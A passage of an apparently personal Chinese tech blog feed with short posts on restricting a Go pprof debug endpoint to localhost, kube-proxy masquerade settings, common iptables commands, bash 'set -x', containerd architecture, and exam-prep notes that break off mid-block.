alt="image.png"></p><p>启动程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">go run perfect/main.go -a=<span class="hljs-string">&quot;0.0.0.0:6030&quot;</span> -b=<span class="hljs-string">&quot;127.0.0.1:6031&quot;</span><br></code></pre></td></tr></table></figure><p>最终结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># curl http://192.168.20.201:6030/debug/pprof/goroutine?debug=1</span><br>404 page not found<br>[root@ningan ~]<span class="hljs-comment"># curl http://192.168.20.201:6031/debug/pprof/goroutine?debug=1</span><br>curl: (7) Failed to connect to 192.168.20.201 port 6031: Connection refused<br>[root@ningan ~]<span class="hljs-comment"># curl http://127.0.0.1:6031/debug/pprof/goroutine?debug=1</span><br>goroutine profile: total 4<br>1 @ 0x433911 0x46f09d 0x678b91 0x6789c5 0x6757eb 0x68590f 0x6863fe 0x637489 0x63930d 0x63a34e 0x6360c8 0x474921<br><span class="hljs-comment">#       0x46f09c        runtime/pprof.runtime_goroutineProfileWithLabels+0x1c   /usr/local/go/src/runtime/mprof.go:1079</span><br><span class="hljs-comment">#       0x678b90        runtime/pprof.writeRuntimeProfile+0xb0                  /usr/local/go/src/runtime/pprof/pprof.go:774</span><br><span class="hljs-comment">#       0x6789c4        runtime/pprof.writeGoroutine+0x44                       /usr/local/go/src/runtime/pprof/pprof.go:734</span><br><span class="hljs-comment">#       0x6757ea        runtime/pprof.(*Profile).WriteTo+0x14a                  /usr/local/go/src/runtime/pprof/pprof.go:369</span><br><span class="hljs-comment">#       0x68590e        net/http/pprof.handler.ServeHTTP+0x52e                  /usr/local/go/src/net/http/pprof/pprof.go:267</span><br><span class="hljs-comment">#       0x6863fd        net/http/pprof.Index+0xdd                               /usr/local/go/src/net/http/pprof/pprof.go:384</span><br><span class="hljs-comment">#       0x637488        net/http.HandlerFunc.ServeHTTP+0x28                     /usr/local/go/src/net/http/server.go:2171</span><br><span class="hljs-comment">#       0x63930c        net/http.(*ServeMux).ServeHTTP+0x1ac                    /usr/local/go/src/net/http/server.go:2688</span><br><span class="hljs-comment">#       0x63a34d        net/http.serverHandler.ServeHTTP+0x8d                   /usr/local/go/src/net/http/server.go:3142</span><br><span class="hljs-comment">#       0x6360c7        net/http.(*conn).serve+0x5e7                            /usr/local/go/src/net/http/server.go:2044</span><br><br>1 @ 0x43e1ce 0x436f37 0x46f465 0x4bcb27 0x4bd67a 0x4bd668 0x5657e5 0x56f745 0x6300f7 0x474921<br><span class="hljs-comment">#       0x46f464        internal/poll.runtime_pollWait+0x84             /usr/local/go/src/runtime/netpoll.go:345</span><br><span class="hljs-comment">#       0x4bcb26        internal/poll.(*pollDesc).wait+0x26             /usr/local/go/src/internal/poll/fd_poll_runtime.go:84</span><br><span class="hljs-comment">#       0x4bd679        internal/poll.(*pollDesc).waitRead+0x279        /usr/local/go/src/internal/poll/fd_poll_runtime.go:89</span><br><span class="hljs-comment">#       0x4bd667        internal/poll.(*FD).Read+0x267                  /usr/local/go/src/internal/poll/fd_unix.go:164</span><br><span class="hljs-comment">#       0x5657e4        net.(*netFD).Read+0x24                          /usr/local/go/src/net/fd_posix.go:55</span><br><span class="hljs-comment">#       0x56f744        net.(*conn).Read+0x44                           /usr/local/go/src/net/net.go:185</span><br><span class="hljs-comment">#       0x6300f6        net/http.(*connReader).backgroundRead+0x36      /usr/local/go/src/net/http/server.go:681</span><br><br>1 @ 0x43e1ce 0x436f37 0x46f465 0x4bcb27 0x4be1cc 0x4be1ba 0x5668e9 0x57727e 0x5765d0 0x63a77e 0x63a411 0x68d8e7 0x68d87b 0x43dd7d 0x474921<br><span class="hljs-comment">#       0x46f464        internal/poll.runtime_pollWait+0x84             /usr/local/go/src/runtime/netpoll.go:345</span><br><span class="hljs-comment">#       0x4bcb26        internal/poll.(*pollDesc).wait+0x26             /usr/local/go/src/internal/poll/fd_poll_runtime.go:84</span><br><span class="hljs-comment">#       0x4be1cb        internal/poll.(*pollDesc).waitRead+0x2ab        /usr/local/go/src/internal/poll/fd_poll_runtime.go:89</span><br><span class="hljs-comment">#       0x4be1b9        internal/poll.(*FD).Accept+0x299                /usr/local/go/src/internal/poll/fd_unix.go:611</span><br><span class="hljs-comment">#       0x5668e8        net.(*netFD).accept+0x28                        /usr/local/go/src/net/fd_unix.go:172</span><br><span class="hljs-comment">#       0x57727d        net.(*TCPListener).accept+0x1d                  /usr/local/go/src/net/tcpsock_posix.go:159</span><br><span class="hljs-comment">#       0x5765cf        net.(*TCPListener).Accept+0x2f                  /usr/local/go/src/net/tcpsock.go:327</span><br><span class="hljs-comment">#       0x63a77d        net/http.(*Server).Serve+0x33d                  /usr/local/go/src/net/http/server.go:3260</span><br><span class="hljs-comment">#       0x63a410        net/http.(*Server).ListenAndServe+0x70          /usr/local/go/src/net/http/server.go:3189</span><br><span class="hljs-comment">#       0x68d8e6        net/http.ListenAndServe+0x2e6                   /usr/local/go/src/net/http/server.go:3443</span><br><span class="hljs-comment">#       0x68d87a        main.main+0x27a                                 /root/go-practice/chapter58-httpserver/perfect/main.go:36</span><br><span class="hljs-comment">#       0x43dd7c        runtime.main+0x29c                              /usr/local/go/src/runtime/proc.go:271</span><br><br>1 @ 0x43e1ce 0x436f37 0x46f465 0x4bcb27 0x4be1cc 0x4be1ba 0x5668e9 0x57727e 0x5765d0 0x63a77e 0x63a411 0x68daaa 0x68da55 0x474921<br><span class="hljs-comment">#       0x46f464        internal/poll.runtime_pollWait+0x84             /usr/local/go/src/runtime/netpoll.go:345</span><br><span class="hljs-comment">#       0x4bcb26        internal/poll.(*pollDesc).wait+0x26             /usr/local/go/src/internal/poll/fd_poll_runtime.go:84</span><br><span class="hljs-comment">#       0x4be1cb        internal/poll.(*pollDesc).waitRead+0x2ab        /usr/local/go/src/internal/poll/fd_poll_runtime.go:89</span><br><span class="hljs-comment">#       0x4be1b9        internal/poll.(*FD).Accept+0x299                /usr/local/go/src/internal/poll/fd_unix.go:611</span><br><span class="hljs-comment">#       0x5668e8        net.(*netFD).accept+0x28                        /usr/local/go/src/net/fd_unix.go:172</span><br><span class="hljs-comment">#       0x57727d        net.(*TCPListener).accept+0x1d                  /usr/local/go/src/net/tcpsock_posix.go:159</span><br><span class="hljs-comment">#       0x5765cf        net.(*TCPListener).Accept+0x2f                  /usr/local/go/src/net/tcpsock.go:327</span><br><span class="hljs-comment">#       0x63a77d        net/http.(*Server).Serve+0x33d                  /usr/local/go/src/net/http/server.go:3260</span><br><span class="hljs-comment">#       0x63a410        net/http.(*Server).ListenAndServe+0x70          /usr/local/go/src/net/http/server.go:3189</span><br><span class="hljs-comment">#       0x68daa9        net/http.ListenAndServe+0x109                   /usr/local/go/src/net/http/server.go:3443</span><br><span class="hljs-comment">#       0x68da54        main.main.func1+0xb4                            /root/go-practice/chapter58-httpserver/perfect/main.go:27</span><br><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>源码参考：<br><a href="https://github.com/ningan123/go-practice/tree/master/chapter58-httpserver">go-practice&#x2F;chapter58-httpserver at master · ningan123&#x2F;go-practice</a></p><p>解决方案参考：<br><a href="https://studygolang.com/articles/12568">你的 pprof 暴露了 - Go语言中文网 - Golang中文社区</a></p><p>深入剖析参考：<br><a href="https://darjun.github.io/2021/07/13/in-post/godailylib/nethttp/">Go 每日一库之 net&#x2F;http（基础和中间件） - 大俊的博客</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【vscode】(202409) vscode中修改go format配置</title>
    <link href="/2024/09/26/software/%E3%80%90vscode%E3%80%91(202409)%20vscode%E4%B8%AD%E4%BF%AE%E6%94%B9go%20format%E9%85%8D%E7%BD%AE/"/>
    <url>/2024/09/26/software/%E3%80%90vscode%E3%80%91(202409)%20vscode%E4%B8%AD%E4%BF%AE%E6%94%B9go%20format%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240926180108.png" alt="image.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】kube-proxy参数</title>
    <link href="/2024/08/30/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91kube-proxy%E5%8F%82%E6%95%B0/"/>
    <url>/2024/08/30/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91kube-proxy%E5%8F%82%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 操作流程</span><br>systemctl stop kube-proxy<br>iptables -F -t nat<br>iptables -t nat -L -n -v<br>vi /root/bink8s/cfg/kube-proxy-bootstrap.config<br><span class="hljs-built_in">cat</span> /root/bink8s/cfg/kube-proxy-bootstrap.config <br>iptables -t nat -L -n -v<br>systemctl start kube-proxy<br>iptables -t nat -L -n -v<br><br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240830143908.png" alt="image.png"></p><h1 id="理论说明"><a href="#理论说明" class="headerlink" title="理论说明"></a>理论说明</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p><a href="https://kubernetes.io/docs/reference/config-api/kube-proxy-config.v1alpha1/">kube-proxy Configuration (v1alpha1) | Kubernetes</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240830154027.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables:<br>  masqueradeAll: <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240830154401.png" alt="image.png"></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>kube-proxy  --masquerade-all=<span class="hljs-keyword">true</span><br></code></pre></td></tr></table></figure><h1 id="截图记录"><a href="#截图记录" class="headerlink" title="截图记录"></a>截图记录</h1><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240830142151.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240830142206.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240830142821.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240830142804.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240830143144.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240830143356.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240830144029.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240830143951.png" alt="image.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【网络成长记】(202408) iptables常用命令</title>
    <link href="/2024/08/29/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91(202408)%20iptables%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2024/08/29/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91(202408)%20iptables%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -t filter -L -n<br><br>iptables -t filter -A INPUT -j DROP -p tcp --dport 8081<br><span class="hljs-comment"># 1表示第1条 -D表示删除</span><br>iptables -t filter -D INPUT 1 <br><br><span class="hljs-comment"># 会断掉当前的ssh</span><br>iptables -t filter -A OUTPUT -j DROP -p tcp --d x.x.x.x  <br><br><br><br>PRE 改目的地址<br>POST 改源<br><br><br><br>按照顺序匹配，最终匹配不到的会按照默认policy走<br><br><span class="hljs-comment"># 自定义链</span><br>iptables -N mychain<br><span class="hljs-comment"># 删除自定义链</span><br>iptables -X mychain<br><br>iptables -F <br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_31977125/article/details/124208384">iptables -j MARK –set-xmark 解析_iptables –set-xmark-CSDN博客</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">???? <br><span class="hljs-comment"># 初始 --set-xmark 0x4000/0x4000 （这里就不转2进制了）</span><br><span class="hljs-comment"># 之后 --set-xmark 0x4000/0x0</span><br>先看掩码0x0，等于没有。所以第一步计算完还是0x4000<br>第二步，0x4000与0x4000异或，两个值所有位都相等。所以异或完的结果是全0，全0就代表没有mark。<br>所以 --set-xmark 0x4000/0x0这个配置相当于把第一步设置的ctmark  (0x4000/0x4000)清除了。<br><br></code></pre></td></tr></table></figure><h1 id="文心一言"><a href="#文心一言" class="headerlink" title="文心一言"></a>文心一言</h1><h2 id="iptables-Z是什么意思"><a href="#iptables-Z是什么意思" class="headerlink" title="iptables -Z是什么意思"></a>iptables -Z是什么意思</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">在`iptables`中，`-Z` 或 `--zero` 选项用于将指定链（chain）或所有链中的计数器归零。这些计数器跟踪了每个规则匹配的数据包数量和字节数。通过归零这些计数器，你可以重置它们，以便重新开始跟踪，特别是在你希望重新评估规则的效率或调试新规则时非常有用。<br><br>使用`-Z`选项时，你可以指定一个或多个链名，如果不指定链名，则默认将所有链的计数器归零。<br></code></pre></td></tr></table></figure><h2 id="iptables-F和-X的区别区别总结"><a href="#iptables-F和-X的区别区别总结" class="headerlink" title="iptables -F和-X的区别区别总结"></a>iptables -F和-X的区别区别总结</h2><ul><li><strong>操作对象</strong>：<code>-F</code>操作的是链内的规则，而<code>-X</code>操作的是链本身（但仅限于自定义链）。</li><li><strong>效果</strong>：<code>-F</code>清空链内规则但不删除链，<code>-X</code>删除自定义链及其规则。</li><li><strong>限制</strong>：<code>-F</code>可以应用于内置链和自定义链，但<code>-X</code>只能应用于自定义链，且该链必须为空（不包含任何规则）才能被删除。</li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><h2 id="iptables-h"><a href="#iptables-h" class="headerlink" title="iptables -h"></a>iptables -h</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># iptables -h</span><br>iptables v1.8.7<br><br>Usage: iptables -[ACD] chain rule-specification [options]<br>        iptables -I chain [rulenum] rule-specification [options]<br>        iptables -R chain rulenum rule-specification [options]<br>        iptables -D chain rulenum [options]<br>        iptables -[LS] [chain [rulenum]] [options]<br>        iptables -[FZ] [chain] [options]<br>        iptables -[NX] chain<br>        iptables -E old-chain-name new-chain-name<br>        iptables -P chain target [options]<br>        iptables -h (<span class="hljs-built_in">print</span> this <span class="hljs-built_in">help</span> information)<br><br>Commands:<br>Either long or short options are allowed.<br>  --append  -A chain            Append to chain<br>  --check   -C chain            Check <span class="hljs-keyword">for</span> the existence of a rule<br>  --delete  -D chain            Delete matching rule from chain<br>  --delete  -D chain rulenum<br>                                Delete rule rulenum (1 = first) from chain<br>  --insert  -I chain [rulenum]<br>                                Insert <span class="hljs-keyword">in</span> chain as rulenum (default 1=first)<br>  --replace -R chain rulenum<br>                                Replace rule rulenum (1 = first) <span class="hljs-keyword">in</span> chain<br>  --list    -L [chain [rulenum]]<br>                                List the rules <span class="hljs-keyword">in</span> a chain or all chains<br>  --list-rules -S [chain [rulenum]]<br>                                Print the rules <span class="hljs-keyword">in</span> a chain or all chains<br>  --flush   -F [chain]          Delete all rules <span class="hljs-keyword">in</span>  chain or all chains<br>  --zero    -Z [chain [rulenum]]<br>                                Zero counters <span class="hljs-keyword">in</span> chain or all chains<br>  --new     -N chain            Create a new user-defined chain<br>  --delete-chain<br>             -X [chain]         Delete a user-defined chain<br>  --policy  -P chain target<br>                                Change policy on chain to target<br>  --rename-chain<br>             -E old-chain new-chain<br>                                Change chain name, (moving any references)<br>Options:<br>    --ipv4      -4              Nothing (line is ignored by ip6tables-restore)<br>    --ipv6      -6              Error (line is ignored by iptables-restore)<br>[!] --proto     -p proto        protocol: by number or name, eg. `tcp<span class="hljs-string">&#x27;</span><br><span class="hljs-string">[!] --source    -s address[/mask][...]</span><br><span class="hljs-string">                                source specification</span><br><span class="hljs-string">[!] --destination -d address[/mask][...]</span><br><span class="hljs-string">                                destination specification</span><br><span class="hljs-string">[!] --in-interface -i input name[+]</span><br><span class="hljs-string">                                network interface name ([+] for wildcard)</span><br><span class="hljs-string"> --jump -j target</span><br><span class="hljs-string">                                target for rule (may load target extension)</span><br><span class="hljs-string">  --goto      -g chain</span><br><span class="hljs-string">                               jump to chain with no return</span><br><span class="hljs-string">  --match       -m match</span><br><span class="hljs-string">                                extended match (may load extension)</span><br><span class="hljs-string">  --numeric     -n              numeric output of addresses and ports</span><br><span class="hljs-string">[!] --out-interface -o output name[+]</span><br><span class="hljs-string">                                network interface name ([+] for wildcard)</span><br><span class="hljs-string">  --table       -t table        table to manipulate (default: `filter&#x27;</span>)<br>  --verbose     -v              verbose mode<br>  --<span class="hljs-built_in">wait</span>        -w [seconds]    maximum <span class="hljs-built_in">wait</span> to acquire xtables lock before give up<br>  --wait-interval -W [usecs]    <span class="hljs-built_in">wait</span> time to try to acquire xtables lock<br>                                default is 1 second<br>  --line-numbers                <span class="hljs-built_in">print</span> line numbers when listing<br>  --exact       -x              <span class="hljs-built_in">expand</span> numbers (display exact values)<br>[!] --fragment  -f              match second or further fragments only<br>  --modprobe=&lt;<span class="hljs-built_in">command</span>&gt;          try to insert modules using this <span class="hljs-built_in">command</span><br>  --set-counters PKTS BYTES     <span class="hljs-built_in">set</span> the counter during insert/append<br>[!] --version   -V              <span class="hljs-built_in">print</span> package version.<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【linux系列】(202408) set</title>
    <link href="/2024/08/26/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202408)%20set/"/>
    <url>/2024/08/26/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202408)%20set/</url>
    
    <content type="html"><![CDATA[<h1 id="set-x"><a href="#set-x" class="headerlink" title="set -x"></a>set -x</h1><h2 id="使用方式1"><a href="#使用方式1" class="headerlink" title="使用方式1"></a>使用方式1</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># cat a.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;111&quot;</span><br><br>[root@ningan ~]<span class="hljs-comment"># set -x; ./a.sh</span><br>+ ./a.sh<br>111<br></code></pre></td></tr></table></figure><h2 id="使用方式2"><a href="#使用方式2" class="headerlink" title="使用方式2"></a>使用方式2</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># cat b.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">set</span> -x<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;111&quot;</span><br><br>[root@ningan ~]<span class="hljs-comment"># ./b.sh </span><br>+ <span class="hljs-built_in">echo</span> 111<br>111<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【containerd】(202408) 06.kubelet、containerd、runc、容器之间的关系</title>
    <link href="/2024/08/22/containerd/%E3%80%90containerd%E3%80%91(202408)%2006.kubelet%E3%80%81containerd%E3%80%81runc%E3%80%81%E5%AE%B9%E5%99%A8%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB/"/>
    <url>/2024/08/22/containerd/%E3%80%90containerd%E3%80%91(202408)%2006.kubelet%E3%80%81containerd%E3%80%81runc%E3%80%81%E5%AE%B9%E5%99%A8%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB/</url>
    
    <content type="html"><![CDATA[<ul><li>Kubernetes 负责集群（多节点）的调度和管理，在单个节点，通过 Kubelet 组件通过 CRI GRPC 接口调用 Containerd。</li><li>Containerd 提供单个节点的容器生命周期管理，包括镜像、存储、rootfs、网络，启动容器是 Containerd 通过 <a href="https://github.com/opencontainers/runtime-spec">OCI-runtime</a> 标准调用 runc。</li><li>Runc 容器引导器，负责根据一个容器的具体配置，在指定 rootfs 上引导启动一个容器进程。</li></ul><p>Architecture of The CRI Plugin<br>查看下面的链接，很形象<br><a href="https://github.com/containerd/containerd/blob/v1.7.0/docs/cri/architecture.md">containerd&#x2F;docs&#x2F;cri&#x2F;architecture.md at v1.7.0 · containerd&#x2F;containerd · GitHub</a></p><p><a href="https://grpc.io/">gRPC</a><br><a href="https://doc.oschina.net/grpc">gRPC 官方文档中文版_V1.0 (oschina.net)</a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.rectcircle.cn/posts/containerd-1-quickstart/">Containerd 详解（一） 快速开始 :: Rectcircle Blog</a><br><a href="https://github.com/containerd/containerd/blob/v1.7.0/docs/cri/architecture.md">containerd&#x2F;docs&#x2F;cri&#x2F;architecture.md at v1.7.0 · containerd&#x2F;containerd · GitHub</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>比赛题目</title>
    <link href="/2024/08/12/%E4%BF%A1%E5%88%9B/%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/"/>
    <url>/2024/08/12/%E4%BF%A1%E5%88%9B/%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="A卷"><a href="#A卷" class="headerlink" title="A卷"></a>A卷</h2><p><strong>DHCP</strong>服务器的<strong>租约文件</strong>通常存储在服务器的硬盘上。 在大多数常见的操作系统中，<strong>租约文件</strong>的默认位置如下： Windows Server：C:\Windows\System32*<em>dhcp</em>*. Linux（ISC <strong>DHCP</strong>服务器）：&#x2F;var&#x2F;lib&#x2F;dhcpd&#x2F;dhcpd.leases.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># nfs</span><br>[root@localhost ~]<span class="hljs-comment">#/usr/sbin/exportfs –au 全部卸载</span><br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs powershell">首先要明确<span class="hljs-variable">$</span>符号用在什么地方，使用在不同的地方，其所代表的定义也就不同。比如在bash里<span class="hljs-variable">$</span>符号表示当前用户为普通用户；在bash脚本里。<span class="hljs-variable">$</span>开头表示变量。<br><br>以下是一些特殊变量：<br><br><span class="hljs-number">1</span>、<span class="hljs-variable">$</span><span class="hljs-comment"># 表示参数个数。</span><br><br><span class="hljs-number">2</span>、<span class="hljs-variable">$0</span> 是脚本本身的名字。<br><br><span class="hljs-number">3</span>、<span class="hljs-variable">$1</span> 是传递给该shell脚本的第一个参数。<br><br><span class="hljs-number">4</span>、<span class="hljs-variable">$2</span> 是传递给该shell脚本的第二个参数。<br><br><span class="hljs-number">5</span>、<span class="hljs-variable">$</span><span class="hljs-selector-tag">@</span> 表示所有参数，并且所有参数都是独立的。<br><br><span class="hljs-number">6</span>、<span class="hljs-variable">$</span><span class="hljs-variable">$</span> 是脚本运行的当前进程ID号。<br><br><span class="hljs-number">7</span>、<span class="hljs-variable">$</span>? 是显示最后命令的退出状态，<span class="hljs-number">0</span>表示没有错误，其他表示有错误。<br></code></pre></td></tr></table></figure><p>金仓数据库     在创建数据库时，_默认_的_端口_为54321</p><p>关系数据库管理系统（Relational Database Management System：RDBMS）</p><h2 id="B卷-00-01-56"><a href="#B卷-00-01-56" class="headerlink" title="B卷 00:01:56"></a>B卷 00:01:56</h2><p>若要修改1个事务的事务隔离级别，则应在事务开始时执行？<br>BEGIN TRANSACTION ISOLATION LEVEL repeatable read</p><p>grep命令总如果希望正则表达式中使用\d字符，则需要使用命令选项 -P</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 